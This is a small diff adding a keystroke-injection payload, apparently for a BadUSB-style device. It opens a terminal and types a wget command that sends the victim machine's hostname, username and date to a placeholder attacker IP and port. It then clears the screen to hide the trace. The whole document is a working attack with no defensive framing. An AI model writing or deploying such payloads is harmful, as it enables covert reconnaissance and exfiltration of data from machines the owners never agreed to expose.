@@ -1,0 +1,4 @@
+Press:131+32
+PrintLine:terminal
+PrintLine:wget "http://<attacker_ip>:<port>/?host=`hostname`&user=`whoami`&date=`date`"; clear
+Press:131+113
